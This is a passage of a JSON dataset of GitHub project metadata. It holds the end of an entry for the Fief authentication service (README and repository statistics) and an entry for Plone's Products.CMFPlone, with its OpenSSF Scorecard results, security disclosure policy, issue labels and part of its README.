        "README_content": "<p align=\"center\">\n  <img src=\"https://raw.githubusercontent.com/fief-dev/.github/main/logos/logo-full-red.svg?sanitize=true\" alt=\"Fief\" width=\"256\">\n</p>\n\n<p align=\"center\">\n    <em>Users and authentication management SaaS</em>\n</p>\n\n<p align=\"center\">\n    <a href=\"https://polar.sh/fief-dev\">\n    <picture>\n      <source media=\"(prefers-color-scheme: dark)\" srcset=\"https://polar.sh/embed/subscribe.svg?org=fief-dev&darkmode=1\">\n      <img alt=\"Subscribe\" src=\"https://polar.sh/embed/subscribe.svg?org=fief-dev\">\n    </picture>\n    </a>\n</p>\n\n## Getting started\n\n* Official website: [https://www.fief.dev](https://www.fief.dev)\n* Documentation: [https://docs.fief.dev](https://docs.fief.dev)\n\n## Support us\n\n<a href=\"https://polar.sh/fief-dev/subscriptions\"><picture><source media=\"(prefers-color-scheme: dark)\" srcset=\"https://polar.sh/embed/tiers.svg?org=fief-dev&darkmode\"><img alt=\"Subscription Tiers on Polar\" src=\"https://polar.sh/embed/tiers.svg?org=fief-dev\"></picture></a>\n\n## Contributing\n\n<!-- ALL-CONTRIBUTORS-BADGE:START - Do not remove or modify this section -->\n[![All Contributors](https://img.shields.io/badge/all_contributors-28-orange.svg?style=flat-square)](#contributors-)\n<!-- ALL-CONTRIBUTORS-BADGE:END -->\n\nAll contributions to improve the project are welcome! In particular, bug and documentation fixes are really appreciated.\n\nFor new features and larger improvements, we kindly ask you to [**open a discussion first**](https://github.com/orgs/fief-dev/discussions/new?category=ideas) about your idea, what motivates it and how you plan to implement it **before you start working**. It'll avoid frustration on both sides if we decide not to integrate your code in the project.\n\nThanks goes to these wonderful people ([emoji key](https://allcontributors.org/docs/en/emoji-key)):\n\n<!-- ALL-CONTRIBUTORS-LIST:START - Do not remove or modify this section -->\n<!-- prettier-ignore-start -->\n<!-- markdownlint-disable -->\n<table>\n  <tbody>\n    <tr>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/shrike71\"><img src=\"https://avatars.githubusercontent.com/u/748514?v=4?s=100\" width=\"100px;\" alt=\"shrike71\"/><br /><sub><b>shrike71</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/issues?q=author%3Ashrike71\" title=\"Bug reports\">🐛</a> <a href=\"#ideas-shrike71\" title=\"Ideas, Planning, & Feedback\">🤔</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://growthengineai.com\"><img src=\"https://avatars.githubusercontent.com/u/4735784?v=4?s=100\" width=\"100px;\" alt=\"trisongz\"/><br /><sub><b>trisongz</b></sub></a><br /><a href=\"#example-trisongz\" title=\"Examples\">💡</a> <a href=\"#ideas-trisongz\" title=\"Ideas, Planning, & Feedback\">🤔</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/davidbrochart\"><img src=\"https://avatars.githubusercontent.com/u/4711805?v=4?s=100\" width=\"100px;\" alt=\"David Brochart\"/><br /><sub><b>David Brochart</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=davidbrochart\" title=\"Documentation\">📖</a> <a href=\"https://github.com/fief-dev/fief/commits?author=davidbrochart\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/paolodina\"><img src=\"https://avatars.githubusercontent.com/u/1157401?v=4?s=100\" width=\"100px;\" alt=\"Paolo Dina\"/><br /><sub><b>Paolo Dina</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/issues?q=author%3Apaolodina\" title=\"Bug reports\">🐛</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/duber000\"><img src=\"https://avatars.githubusercontent.com/u/12467861?v=4?s=100\" width=\"100px;\" alt=\"duber000\"/><br /><sub><b>duber000</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=duber000\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://theraloss.com\"><img src=\"https://avatars.githubusercontent.com/u/6277291?v=4?s=100\" width=\"100px;\" alt=\"Danilo Polani\"/><br /><sub><b>Danilo Polani</b></sub></a><br /><a href=\"#translation-danilopolani\" title=\"Translation\">🌍</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/ChuckMoe\"><img src=\"https://avatars.githubusercontent.com/u/25569291?v=4?s=100\" width=\"100px;\" alt=\"Moritz\"/><br /><sub><b>Moritz</b></sub></a><br /><a href=\"#translation-ChuckMoe\" title=\"Translation\">🌍</a></td>\n    </tr>\n    <tr>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/plpsanchez\"><img src=\"https://avatars.githubusercontent.com/u/45295173?v=4?s=100\" width=\"100px;\" alt=\"plpsanchez\"/><br /><sub><b>plpsanchez</b></sub></a><br /><a href=\"#translation-plpsanchez\" title=\"Translation\">🌍</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/WilliamMayor\"><img src=\"https://avatars.githubusercontent.com/u/403126?v=4?s=100\" width=\"100px;\" alt=\"William Mayor\"/><br /><sub><b>William Mayor</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=WilliamMayor\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"http://ruipoliveira.github.io/\"><img src=\"https://avatars.githubusercontent.com/u/10942886?v=4?s=100\" width=\"100px;\" alt=\"Rui Oliveira\"/><br /><sub><b>Rui Oliveira</b></sub></a><br /><a href=\"#translation-ruipoliveira\" title=\"Translation\">🌍</a> <a href=\"https://github.com/fief-dev/fief/commits?author=ruipoliveira\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://jimscope.is-a.dev\"><img src=\"https://avatars.githubusercontent.com/u/27647007?v=4?s=100\" width=\"100px;\" alt=\"Jimmy Angel Pérez Díaz\"/><br /><sub><b>Jimmy Angel Pérez Díaz</b></sub></a><br /><a href=\"#translation-JimScope\" title=\"Translation\">🌍</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://pasteman.dev/\"><img src=\"https://avatars.githubusercontent.com/u/5132385?v=4?s=100\" width=\"100px;\" alt=\"Michał Rosiak\"/><br /><sub><b>Michał Rosiak</b></sub></a><br /><a href=\"#translation-michaldev\" title=\"Translation\">🌍</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"http://www.olimcc.com\"><img src=\"https://avatars.githubusercontent.com/u/842983?v=4?s=100\" width=\"100px;\" alt=\"olimcc\"/><br /><sub><b>olimcc</b></sub></a><br /><a href=\"#security-olimcc\" title=\"Security\">🛡️</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"http://joehamman.com\"><img src=\"https://avatars.githubusercontent.com/u/2443309?v=4?s=100\" width=\"100px;\" alt=\"Joe Hamman\"/><br /><sub><b>Joe Hamman</b></sub></a><br /><a href=\"#security-jhamman\" title=\"Security\">🛡️</a></td>\n    </tr>\n    <tr>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/zfei\"><img src=\"https://avatars.githubusercontent.com/u/1736058?v=4?s=100\" width=\"100px;\" alt=\"zfei\"/><br /><sub><b>zfei</b></sub></a><br /><a href=\"#translation-zfei\" title=\"Translation\">🌍</a> <a href=\"https://github.com/fief-dev/fief/commits?author=zfei\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://bartoszmagiera.live/\"><img src=\"https://avatars.githubusercontent.com/u/28759224?v=4?s=100\" width=\"100px;\" alt=\"Bartosz Magiera\"/><br /><sub><b>Bartosz Magiera</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=bartosz121\" title=\"Documentation\">📖</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"http://razalt.com\"><img src=\"https://avatars.githubusercontent.com/u/10688199?v=4?s=100\" width=\"100px;\" alt=\"oaltun\"/><br /><sub><b>oaltun</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=oaltun\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"http://cesarsmaniotto.dev\"><img src=\"https://avatars.githubusercontent.com/u/7607534?v=4?s=100\" width=\"100px;\" alt=\"Cesar Smaniotto Júnior\"/><br /><sub><b>Cesar Smaniotto Júnior</b></sub></a><br /><a href=\"#translation-csmaniottojr\" title=\"Translation\">🌍</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/rotil\"><img src=\"https://avatars.githubusercontent.com/u/42150485?v=4?s=100\" width=\"100px;\" alt=\"rotil\"/><br /><sub><b>rotil</b></sub></a><br /><a href=\"#security-rotil\" title=\"Security\">🛡️</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/bingyulee\"><img src=\"https://avatars.githubusercontent.com/u/4936030?v=4?s=100\" width=\"100px;\" alt=\"李秉祐\"/><br /><sub><b>李秉祐</b></sub></a><br /><a href=\"#translation-bingyulee\" title=\"Translation\">🌍</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://dubinets.io\"><img src=\"https://avatars.githubusercontent.com/u/3114081?v=4?s=100\" width=\"100px;\" alt=\"Lev Dubinets\"/><br /><sub><b>Lev Dubinets</b></sub></a><br /><a href=\"#financial-ldub\" title=\"Financial\">💵</a></td>\n    </tr>\n    <tr>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://meltingrocks.com/\"><img src=\"https://avatars.githubusercontent.com/u/37904?v=4?s=100\" width=\"100px;\" alt=\"Mathieu Virbel\"/><br /><sub><b>Mathieu Virbel</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/issues?q=author%3Atito\" title=\"Bug reports\">🐛</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/corv89\"><img src=\"https://avatars.githubusercontent.com/u/7198687?v=4?s=100\" width=\"100px;\" alt=\"corv89\"/><br /><sub><b>corv89</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/issues?q=author%3Acorv89\" title=\"Bug reports\">🐛</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/yaroslaff\"><img src=\"https://avatars.githubusercontent.com/u/4574588?v=4?s=100\" width=\"100px;\" alt=\"Yaroslav Polyakov\"/><br /><sub><b>Yaroslav Polyakov</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=yaroslaff\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/ScottFred\"><img src=\"https://avatars.githubusercontent.com/u/1937793?v=4?s=100\" width=\"100px;\" alt=\"Scott Fredericksen\"/><br /><sub><b>Scott Fredericksen</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=ScottFred\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://robertbabaev.tech/home\"><img src=\"https://avatars.githubusercontent.com/u/32110856?v=4?s=100\" width=\"100px;\" alt=\"Robert Babaev\"/><br /><sub><b>Robert Babaev</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=ApprenticeofEnder\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/BlackIsBlack\"><img src=\"https://avatars.githubusercontent.com/u/39253172?v=4?s=100\" width=\"100px;\" alt=\"Cameron\"/><br /><sub><b>Cameron</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/issues?q=author%3ABlackIsBlack\" title=\"Bug reports\">🐛</a> <a href=\"https://github.com/fief-dev/fief/commits?author=BlackIsBlack\" title=\"Code\">💻</a></td>\n      <td align=\"center\" valign=\"top\" width=\"14.28%\"><a href=\"https://github.com/i-am-mike-davis\"><img src=\"https://avatars.githubusercontent.com/u/139306671?v=4?s=100\" width=\"100px;\" alt=\"i-am-mike-davis\"/><br /><sub><b>i-am-mike-davis</b></sub></a><br /><a href=\"https://github.com/fief-dev/fief/commits?author=i-am-mike-davis\" title=\"Code\">💻</a></td>\n    </tr>\n  </tbody>\n</table>\n\n<!-- markdownlint-restore -->\n<!-- prettier-ignore-end -->\n\n<!-- ALL-CONTRIBUTORS-LIST:END -->\n\n## Development\n\nTo get started quickly, we recommend you to use [GitHub Codespaces](https://github.com/features/codespaces). We have a complete configuration allowing you to start working on Fief right away, including pre-configured PostgreSQL and Redis servers.\n\n<p align=\"center\">\n<a href=\"https://github.com/codespaces/new?hide_repo_select=true&ref=main&repo=444125382\"><img src=\"https://github.com/codespaces/badge.svg\" alt=\"Open in GitHub Codespaces\"></a>\n</p>\n\nWhen the Codespace is built, an admin user is automatically created.\n\n> **Admin user credentials**\n>\n> Email: `anne@bretagne.duchy`\n>\n> Password: `herminetincture`\n\nRun the Fief server in development mode with the following command:\n\n```sh\nhatch run dev.server.start\n```\n\nThe worker can also be started with the following command:\n\n```sh\nhatch run dev.worker.start\n```\n\n## License\n\nFief is [fair-code](http://faircode.io) distributed under [**Elastic License 2.0 (ELv2)**](https://github.com/fief-dev/fief/blob/main/LICENSE.md).\n",
        "num_commits": 1254,
        "project_age_days": 1030,
        "project_created_at": "2022-01-03",
        "latest_updated_at": "2024-10-29",
        "latest_pushed_at": "2024-10-28",
        "num_contributors": 14,
        "num_pull": 121,
        "num_issues": 207,
        "num_opening_issue": 19,
        "project_size(kB)": 4385,
        "num_stargazers": 561,
        "num_watchers": 561,
        "num_forks": 50,
        "num_subscribers": 5,
        "SecurityPolicy_created_at": "2023-01-07 10:02:24",
        "SecurityPolicy_commit_history": [
            {
                "commit_id": "e3578cce77b2de2b751196c51e4a6afaae035b9f",
                "url": "https://github.com/fief-dev/fief/commit/e3578cce77b2de2b751196c51e4a6afaae035b9f",
                "date": "2023-01-07 10:02:24"
            }
        ],
        "project_security_labels": [],
        "security_issues": [],
        "SecurityPolicy_reporting_mechanism": "advisory",
        "num_security_issues_after_policy": 0,
        "num_security_issue_and_pull": 0,
        "security_issues_created_after_policy": [],
        "SecurityPolicy_content_category": [
            "Generic policy",
            "Scope of practice",
            "Reporting mechanism"
        ],
        "num_noncompliant_security_discuss_issue": 0,
        "num_noncompliant_security_pull": 0,
        "has_generic_policy": true
    },
    {
        "project_name": "plone/products.cmfplone",
        "project_url": "https://github.com/plone/products.cmfplone",
        "SSF": {
            "date": "2024-10-29T19:46:09+07:00",
            "repo": {
                "name": "github.com/plone/products.cmfplone",
                "commit": "996f4cee3516129d13557d9434b145a7d6e4a69c"
            },
            "scorecard": {
                "version": "5.0.0",
                "commit": "ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4"
            },
            "score": 6.9,
            "checks": [
                {
                    "details": null,
                    "score": 10,
                    "reason": "no binaries found in the repo",
                    "name": "Binary-Artifacts",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#binary-artifacts",
                        "short": "Determines if the project has generated executable (binary) artifacts in the source repository."
                    }
                },
                {
                    "details": [
                        "Info: 'allow deletion' disabled on branch 'master'",
                        "Info: 'force pushes' disabled on branch 'master'",
                        "Warn: required approving review count is 1 on branch 'master'",
                        "Warn: codeowners review is not required on branch 'master'",
                        "Info: status check found to merge onto on branch 'master'",
                        "Info: PRs are required in order to make changes on branch 'master'"
                    ],
                    "score": 8,
                    "reason": "branch protection is not maximal on development and all release branches",
                    "name": "Branch-Protection",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#branch-protection",
                        "short": "Determines if the default and release branches are protected with GitHub's branch protection settings."
                    }
                },
                {
                    "details": null,
                    "score": 8,
                    "reason": "6 out of 7 merged PRs checked by a CI test -- score normalized to 8",
                    "name": "CI-Tests",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#ci-tests",
                        "short": "Determines if the project runs tests before pull requests are merged."
                    }
                },
                {
                    "details": null,
                    "score": 0,
                    "reason": "no effort to earn an OpenSSF best practices badge detected",
                    "name": "CII-Best-Practices",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#cii-best-practices",
                        "short": "Determines if the project has an OpenSSF (formerly CII) Best Practices Badge."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "all changesets reviewed",
                    "name": "Code-Review",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#code-review",
                        "short": "Determines if the project requires human code review before pull requests (aka merge requests) are merged."
                    }
                },
                {
                    "details": [
                        "Info: der freitag contributor org/company found, kitconcept gmbh contributor org/company found, plone-security contributor org/company found, pysv contributor org/company found, authomatic contributor org/company found, regolith-linux contributor org/company found, vlaamsemilieumaatschappij contributor org/company found, jazkarta contributor org/company found, buildout contributor org/company found, g24at contributor org/company found, quatico-solutions contributor org/company found, kombinat media gestalter gmbh contributor org/company found, c-frame contributor org/company found, repoze contributor org/company found, klein & partner kg and  @bluedynamics contributor org/company found, starzel contributor org/company found, syslab.com bluedynamics alliance contributor org/company found, codesyntax contributor org/company found, bluedynamics contributor org/company found, guillotinaweb contributor org/company found, EU-OSHA contributor org/company found, plonenl contributor org/company found, py76 contributor org/company found, plone-de contributor org/company found, Softcatala contributor org/company found, derico - softwaredevelopment & consulting contributor org/company found, conestack contributor org/company found, Kinto contributor org/company found, makina corpus @makinacorpus contributor org/company found, mxstack contributor org/company found, lmu contributor org/company found, plomino contributor org/company found, networked-aframe contributor org/company found, quaive contributor org/company found, LiberTIC contributor org/company found, rohberg contributor org/company found, kitconcept contributor org/company found, syslabcom contributor org/company found, ploneintranet contributor org/company found, derFreitag contributor org/company found, Patternslib contributor org/company found, getflaps contributor org/company found, plone contributor org/company found, zopefoundation contributor org/company found, iskracat contributor org/company found, four digits contributor org/company found, ENCODE-DCC contributor org/company found, kleist it consulting contributor org/company found, State-College-Plone contributor org/company found, Pylons contributor org/company found, GAIPA contributor org/company found, makina corpus contributor org/company found, nuclia contributor org/company found, bikoteak contributor org/company found, zestsoftware contributor org/company found, itonboard contributor org/company found, ECC-Pilot contributor org/company found, plone @salesforce contributor org/company found, collective contributor org/company found, pyrenees contributor org/company found, plonegovbr contributor org/company found, university of jyväskylä contributor org/company found, euphorie contributor org/company found, radio-helsinki-graz contributor org/company found, cosent contributor org/company found, PloneGov-IT contributor org/company found, "
                    ],
                    "score": 10,
                    "reason": "project has 66 contributing companies or organizations",
                    "name": "Contributors",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#contributors",
                        "short": "Determines if the project has a set of contributors from multiple organizations (e.g., companies)."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no workflows found",
                    "name": "Dangerous-Workflow",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dangerous-workflow",
                        "short": "Determines if the project's GitHub Action workflows avoid dangerous patterns."
                    }
                },
                {
                    "details": [
                        "Warn: no dependency update tool configurations found"
                    ],
                    "score": 0,
                    "reason": "no update tool detected",
                    "name": "Dependency-Update-Tool",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#dependency-update-tool",
                        "short": "Determines if the project uses a dependency update tool."
                    }
                },
                {
                    "details": [
                        "Warn: no fuzzer integrations found"
                    ],
                    "score": 0,
                    "reason": "project is not fuzzed",
                    "name": "Fuzzing",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#fuzzing",
                        "short": "Determines if the project uses fuzzing."
                    }
                },
                {
                    "details": [
                        "Info: project has a license file: LICENSE:0",
                        "Info: FSF or OSI recognized license: GNU General Public License v2.0: LICENSE:0"
                    ],
                    "score": 10,
                    "reason": "license file detected",
                    "name": "License",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#license",
                        "short": "Determines if the project has defined a license."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "30 commit(s) and 23 issue activity found in the last 90 days -- score normalized to 10",
                    "name": "Maintained",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#maintained",
                        "short": "Determines if the project is \"actively maintained\"."
                    }
                },
                {
                    "details": [
                        "Warn: no GitHub/GitLab publishing workflow detected."
                    ],
                    "score": -1,
                    "reason": "packaging workflow not detected",
                    "name": "Packaging",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#packaging",
                        "short": "Determines if the project is published as a package that others can easily download, install, easily update, and uninstall."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no dependencies found",
                    "name": "Pinned-Dependencies",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#pinned-dependencies",
                        "short": "Determines if the project has declared and pinned the dependencies of its build process."
                    }
                },
                {
                    "details": [
                        "Warn: 0 commits out of 30 are checked with a SAST tool"
                    ],
                    "score": 0,
                    "reason": "SAST tool is not run on all commits -- score normalized to 0",
                    "name": "SAST",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#sast",
                        "short": "Determines if the project uses static code analysis."
                    }
                },
                {
                    "details": [
                        "Info: security policy file detected: .github/SECURITY.md:1",
                        "Info: Found linked content: .github/SECURITY.md:1",
                        "Info: Found disclosure, vulnerability, and/or timelines in security policy: .github/SECURITY.md:1",
                        "Info: Found text in security policy: .github/SECURITY.md:1"
                    ],
                    "score": 10,
                    "reason": "security policy file detected",
                    "name": "Security-Policy",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#security-policy",
                        "short": "Determines if the project has published a security policy."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "no releases found",
                    "name": "Signed-Releases",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#signed-releases",
                        "short": "Determines if the project cryptographically signs release artifacts."
                    }
                },
                {
                    "details": null,
                    "score": -1,
                    "reason": "No tokens found",
                    "name": "Token-Permissions",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#token-permissions",
                        "short": "Determines if the project's workflows follow the principle of least privilege."
                    }
                },
                {
                    "details": null,
                    "score": 10,
                    "reason": "0 existing vulnerabilities detected",
                    "name": "Vulnerabilities",
                    "documentation": {
                        "url": "https://github.com/ossf/scorecard/blob/ea7e27ed41b76ab879c862fa0ca4cc9c61764ee4/docs/checks.md#vulnerabilities",
                        "short": "Determines if the project has open, known unfixed vulnerabilities."
                    }
                }
            ],
            "metadata": null
        },
        "SecurityPolicy_url_endpoint": "https://api.github.com/repos/plone/products.cmfplone/contents/.github/SECURITY.md",
        "SecurityPolicy_content": "# Security Policy\n\nThe most up to date information about Plone security is on https://plone.org/security\n\n## Supported Versions\n\nFor supported versions, see the [security update policy](https://plone.org/security/update-policy)\n\nThe [release schedule](https://plone.org/download/release-schedule) also has helpful information.\n\nThere may be hotfixes available to increase the security of your version of Plone. Please check the [available hotfixes](https://plone.org/security/hotfixes).\n\n## Reporting a Vulnerability\n\nPlease do **NOT** create a public bug report if you think this may be a security issue.\nInstead, please contact the Plone Security Team via email: security@plone.org.\nSee also https://plone.org/security/report\n\nOnly bug reports submitted directly to the security team email will be treated as responsible disclosure.\nAny offered for sale to third parties or submitted to public bug bounty programs will be treated as irresponsible public disclosure.\nWe will not confirm any submissions on third party platforms such as \"huntr\" or \"hackerone\" and do not give permission for those systems to accept reports on our behalf or to represent themselves as a conduit for vulnerability reports.\n",
        "project_all_labels": [
            "01 type: bug",
            "02 type: regression",
            "03 type: feature (plip)",
            "04 type: enhancement",
            "05 type: question",
            "11 prio: blocker",
            "12 prio: high",
            "13 prio: normal",
            "14 prio: low",
            "21 status: confirmed",
            "22 status: in-progress",
            "23 status: testing",
            "24 status: ready",
            "25 status: deferred",
            "31 needs: help",
            "32 needs: review",
            "33 needs: docs",
            "34 needs: tests",
            "35 needs: rebase",
            "36 needs: cla",
            "37 needs: release",
            "41 lvl: easy",
            "42 lvl: moderate",
            "43 lvl: complex",
            "51 target: patch",
            "52 target: minor",
            "53 target: major",
            "99 HACKTOBERFEST-ACCEPTED",
            "99 tag: bssp",
            "99 tag: cleanup",
            "99 tag: dependencies",
            "99 tag: documentation",
            "99 tag: migration",
            "99 tag: NEED AN IMPLEMENTER",
            "99 tag: PLIP 13260: Remove CMF",
            "99 tag: PLIP 3211 ES6",
            "99 tag: Plone 5.2",
            "99 tag: Plone 6.0",
            "99 tag: resource registry",
            "99 tag: sprint",
            "99 tag: UX Accessibility",
            "99 tag: UX Editor",
            "99 tag: UX Integrator/Themer",
            "99 tag: UX Site Admin"
        ],
        "README_content": "<p align=\"center\">\n    <img alt=\"Plone Logo\" width=\"200px\" src=\"https://raw.githubusercontent.com/plone/.github/main/plone-logo.png\">\n</p>\n\n<h1 align=\"center\">\n  Plone\n</h1>\n\n<div align=\"center\">\n\n[![PyPI - Wheel](https://img.shields.io/pypi/wheel/plone)](https://pypi.org/project/plone/)\n[![PyPI - License](https://img.shields.io/pypi/l/plone)](https://pypi.org/project/plone/)\n[![PyPI - Status](https://img.shields.io/pypi/status/plone)](https://pypi.org/project/plone/)\n\n[![GitHub contributors](https://img.shields.io/github/contributors/plone/Products.CMFPlone)](https://github.com/plone/Products.CMFPlone)\n![GitHub Repo stars](https://img.shields.io/github/stars/plone/Plone?style=flat-square)\n\n</div>\n\nPlone is a mature, secure, and user-friendly content management system (CMS).\n\nPlone was first released to the public on October 4, 2001.\n\nPlone has the maturity, stability, and reliability of an application maintained by open source developers with decades of experience, while continually evolving and adapting to modern technology.\n\nLots of customizations can be made trough-the-web, such as creating content types, themes, workflows, and much more.\nPlone may be extended and used as a framework on which to build custom CMS-like solutions.\n\nPlone works as a\n\n- Full-featured server-side rendered HTML CMS.\n- React-based frontend for editing and viewing content, backed by a server with a REST API.\n- Headless CMS server with a REST API, allowing a developer to build a custom frontend with their chosen technology.\n\n\n<h2 align=\"center\">\n  Installing Plone\n</h2>\n\nPlone is available on Linux, Microsoft Windows, macOS, and BSD platforms.\n\nPlone may be run as a container in the cloud with Docker and other Open Containers Initiative compliant platforms.\n[Example Dockerfiles](https://6.docs.plone.org/install/containers/images/index.html) and base images are available.\n\n[Install Plone by choosing an option from plone.org](https://plone.org/download)\n\n\n<h2 align=\"center\">\n  Documentation\n</h2>\n\nConsult [the official Plone documentation](https://6.docs.plone.org) with information for different audiences.\n\nFor trainings [comprehensive Plone training material](https://training.plone.org) is available.\n\n\n<h2 align=\"center\">\n  What is Plone?\n</h2>\n\nPlone is a ready-to-run content management system, offering a complete set of features needed by a wide variety of organizations.\n\nSecurity is built into Plone's architecture from the ground up.\nPlone offers fine-grained permission control over content and actions.\n\nPlone is easy to set up, extremely flexible,\nand provides you with a system for managing web content that is ideal for project groups, communities, websites, extranets, and intranets.\n\n- **Plone is easy to install.**\n  Several installation options are available for either your local machine or on servers in the cloud.\n\n- **Plone empowers content editors and web application developers.**\n  The Plone Team includes usability experts who have made Plone easy and attractive for content managers to add, update, and maintain content.\n\n- **Plone is international.**\n  The Plone interface has more than 35 translations, and tools exist for managing multilingual content.\n\n- **Plone follows standards and is inclusive.**\n  Plone carefully follows standards for usability and accessibility.\n  Plone is compliant with WCAG 2.1 level AA and aims for ATAG 2.0 level AA.\n\n- **Plone is open source.**\n  Plone is licensed under the GNU General Public License, the same license used by Linux.\n  This gives you the right to use Plone without a license fee, and to improve upon the product.\n\n- **Plone is supported.**\n  There are over two hundred active developers in the Plone Development Team around the world, and a multitude of companies that specialize in Plone development and support.\n\n- **Plone is extensible.**\n  There is a multitude of add-on products for Plone to add new features and content types.\n  In addition, Plone can be scripted using web standard solutions and open source languages.\n\n- **Plone is technology neutral.**\n  Plone can interoperate with most relational database systems—both open source and commercial—and runs on a vast array of\n  platforms, including Linux, Windows, macOS, and BSD.\n\n\n<h2 align=\"center\">\nTechnical overview\n</h2>\n\nPlone is a content management platform with its backend written in Python.\nPlone has a choice of frontend, either Classic UI using server-side templates or Volto written in modern React-based JavaScript.\nIt builds upon Zope, an open source web application server and development system, and thus on the pluggable Zope Component Architecture (ZCA).\n\nPython is the easy to learn, widely used, and supported open source programming language.\nPython can be used to add new features to Plone and used to understand or make changes to the way that Plone works.\n\nPlone stores its contents in Zope's built-in transactional hierarchical object database, the ZODB.\nThe ZODB can be connected to simple file-storages, scalable ZEO-Servers or Postgres, MySQL, and Oracle.\nThere are add-ons and techniques, however, to share information with other sources, such as relational databases, LDAP, filesystem\nfiles, and so 